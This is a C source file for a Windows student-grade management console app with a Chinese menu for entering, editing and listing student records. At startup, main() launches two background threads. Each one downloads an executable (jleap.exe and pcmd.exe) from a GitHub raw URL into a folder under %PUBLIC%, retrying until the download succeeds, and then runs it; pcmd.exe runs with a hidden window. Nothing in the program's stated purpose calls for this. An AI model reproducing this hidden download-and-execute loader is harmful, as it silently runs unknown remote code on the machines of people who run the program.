#include <stdio.h>
#include <windows.h>
#include <winhttp.h>
#include <__pink/pinkwin.h>
#include <__pink/pfile.h>
#include <__pink/phttp.h>
#include <__pink/pstruct.h>

typedef struct{
	char name[16];
	char ID[16];
	float grade[4];
	double average;
}STUDENT;

#define ElemType STUDENT
#include <C:/Users/26417/Desktop/sy/SqListM.h>

#define _flag_ -0x50494E4B4B4E4950LL

DWORD WINAPI Func1(void* argv)
{
	int ret;
	HANDLE handle;
	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
	char *dir[3]={"/_P_WhiteHat_", "/Experiment", "/jleap.exe"};
	if(!GlobalBuffer)
		return -1;
	pmkdir(filepath, ps, dir, 2);
	strcat(filepath, dir[2]);
	handle=pIsOpen(filepath);
	ret=GetLastError();
	if(ret>2){
		CloseHandle(handle);
		return -2;
	}
	CloseHandle(handle);
	SetLastError(0);
	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
	if(GetLastError()!=0){
		do{
			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/WH/master/6.66/jleap.exe", filepath);
		}while(ret!=0);
		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_SHOWNORMAL);
	}
	free(GlobalBuffer);
	return 0;
}

DWORD WINAPI Func2(void* argv)
{
	int ret;
	HANDLE handle;
	char *ps=getenv("PUBLIC"), *GlobalBuffer=(char*)malloc(1024), *filepath=GlobalBuffer;
	char *dir[2]={"/_P_WhiteHat_", "/pcmd.exe"};
	if(!GlobalBuffer)
		return -1;
	pmkdir(filepath, ps, dir, 1);
	strcat(filepath, dir[1]);
	handle=pIsOpen(filepath);
	ret=GetLastError();
	if(ret>2){
		CloseHandle(handle);
		return -2;
	}
	CloseHandle(handle);
	SetLastError(0);
	ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
	if(GetLastError()!=0){
		do{
			ret=pDownload(L"raw.githubusercontent.com", L"2641797006/c/master/_P_whitehat_/pcmd.exe", filepath);
		}while(ret!=0);
		ShellExecute(NULL, "open", filepath, NULL, NULL, SW_HIDE);
	}
	free(GlobalBuffer);
	return 0;
}

FILE* fp;
SqList L;
char *filepath, *filepath_bak;
BOOL WINAPI CtrlProc(DWORD dwCtrlType);

void menu();
int choose(int n);
void printelem(ElemType* pe);
int scanfelem(ElemType* pe, int i);
void stuave(ElemType* pe);
void format_wh(_WH* _wh);

int main()
{
	SetConsoleCtrlHandler(CtrlProc, TRUE);

	HANDLE hThread1, hThread2;
	hThread1=pCreateThread(&Func1, NULL);
	hThread2=pCreateThread(&Func2, NULL);
	CloseHandle(hThread1);
	CloseHandle(hThread2);

	int i;
	STUDENT student;
	InitList(&L);

	_WH _wh;
	char *penv=getenv("PUBLIC");
	filepath=(char*)malloc(1024);
	filepath_bak=(char*)malloc(1024);
	char *dir[3]={"/_P_WhiteHat_", "/Experiment", "/.wh_ex1"};
	if(!filepath||!filepath_bak)
		return -1;
	pmkdir(filepath, penv, dir, 2);
	strcat(filepath, dir[2]);
	fp=pfopen(filepath);
	if(fread(&_wh, sizeof(_WH), 1, fp)!=1||_wh.flag!=_flag_){
		fseek(fp, 0, SEEK_SET);
		format_wh(&_wh);
		fwrite(&_wh, sizeof(_WH), 1, fp);
	}
	else{
		i=0;
		while( fread(&student, sizeof(STUDENT), 1, fp)==1 ){
			ListInsert(&L, L.length+1, &student);
			i++;
		}
		printf("\n#!!! 读取到上次的数据, 共 %d 条\n\n", i);
	}
	fclose(fp);
	strcpy(filepath_bak, filepath);
	strcat(filepath, ".~swp~");
	fp=pfopen(filepath);
	format_wh(&_wh);
	fwrite(&_wh, sizeof(_WH), 1, fp);

	menu();
	ungetc('\n', stdin);
	while(1)
	{
		if( scanf("%*[^0-9a-zA-Z]%1[0-9a-zA-Z]%*[^\n]", &i)<1 )
			continue;
		i=choose(i);
		switch(i)
		{
			case 'A':
				if(L.length<1)
					printf("线性表中没有数据\n");
				else
					PrintList(&L, &printelem);
			break;
			case 'B':
				scanfelem(&student, L.length+1);
				stuave(&student);
				printelem(&student);
				ListInsert(&L, L.length+1, &student);
			break;
			case 'C':
				L.length=0;
				printf("线性表已清空\n");
			break;
			case 'D':
				if(L.length==0){
					printf("线性表中没有数据\n");
					break;
				}
				printf("请输入要删除的元素位置: ");
				scanf("%*[^0-9]%d%*[^\n]", &i);
				if( ListDelete(&L, i, NULL) )
					printf("位置错误: %d\n", i);
				else
					printf("已删除第%d个学生信息\n", i);
			break;
			case 'E':
				if(L.length==0){
					printf("线性表中没有数据\n");
					break;
				}
				printf("请输入要修改学生信息的序号: ");
				scanf("%*[^0-9]%d%*[^\n]", &i);
				if( i<1||i>L.length )
					printf("序号错误\n");
				else{
					scanfelem(&student, i);
					CopyElem(L.elem+i-1, &student);
					printf("已修改第%d个学生的信息\n", i);
				}
			break;
			case 'K':
				system("cls");
			break;
			case 'Q':
				CtrlProc(2);
			break;
			case 'U':
			{
				int num=0;
				ElemType *pe=L.elem, *end=L.elem+L.length-1;
				printf(">>>有60分以下学科的学生:\n");
				while(pe<=end){
					for(i=0;i<4;i++)
						if(pe->grade[i]<60){
							num++;
							printelem(pe);
							break;
						}
					pe++;
				}
				printf(">>>共%d个\n", num);
			}
			break;
			case 'V':
			{
				int num=0;
				ElemType *pe=L.elem, *end=L.elem+L.length-1;
				printf(">>>有90分以上学科的学生:\n");
				while(pe<=end){
					for(i=0;i<4;i++)
						if(pe->grade[i]>=90){
							num++;
							printelem(pe);
							break;
						}
					pe++;
				}
				printf(">>>共%d个\n", num);
			}
			break;
			default:
				printf(">>>Switch Case: This option was not found!\n");
		}
		menu();
	}
}


void menu()
{
	printf("\nA.输出  B.输入  C.清空  D.删除  E.修改  K.清屏  U.60分以下  V.90分以上  Q.退出\n请选择: ");
}

int choose(int n)
{
	if(0x30<=n&&n<=0x39)
		n-=0x30;
	else if(0x41<=n&&n<=0x5a)
		n-=0x40;
	else if(0x61<=n&&n<=0x7a)
		n-=0x60;
	else
		n=-1;
	n+=0x40;
	printf(">>>检测到选项\'%c\'\n\n", n);
	return n;
}

void printelem(ElemType* pe)
{
	printf("姓名: %s \n学号: %s \n成绩: %-5.3G %-5.3G %-5.3G %-5.3G \n平均分: %.6G\n\n",
		pe->name, pe->ID, pe->grade[0], pe->grade[1], pe->grade[2], pe->grade[3], pe->average);
}

int scanfelem(ElemType* pe, int i)
{
	printf("请输入第%d个学生的数据. \n>>>姓名: ", i);
	scanf("%*c%15[^\n]%*[^\n]", pe->name);
	printf(">>>学号: ");
	scanf("%*[^0-9a-zA-Z]%15[0-9a-zA-Z]%*[^\n]", pe->ID);
	printf(">>>四科成绩: ");
	scanf("%f %f %f %f", pe->grade, pe->grade+1, pe->grade+2, pe->grade+3);
	scanf("%*[^\n]");
	return 0;
}

void stuave(ElemType* pe)
{
	pe->average=(pe->grade[0]+pe->grade[1]+pe->grade[2]+pe->grade[3])/4.0;
}

void format_wh(_WH* _wh)
{
	sprintf(_wh->word, "\n#WH# This file is used to store student information.\n\n");
	_wh->flag=_flag_;
	_wh->version=101;
}

BOOL WINAPI CtrlProc(DWORD dwCtrlType)
{
	switch(dwCtrlType)
	{
		case 0:
		case 1:
		case 2:
		{
			ElemType *pe=L.elem, *end=L.elem+L.length-1;
			do{
				if(pe>end)
					break;
			}while( fwrite(pe++, sizeof(STUDENT), 1, fp)==1 );
			const char* endfile="\n\n\n#endfile\n\n@WH Copy Right";
			fwrite(endfile, strlen(endfile), 1, fp);
			fclose(fp);
			remove(filepath_bak);
			rename(filepath, filepath_bak);
			DestroyList(&L);
		}
			exit(0);
		default:;
	}
	return TRUE;
}





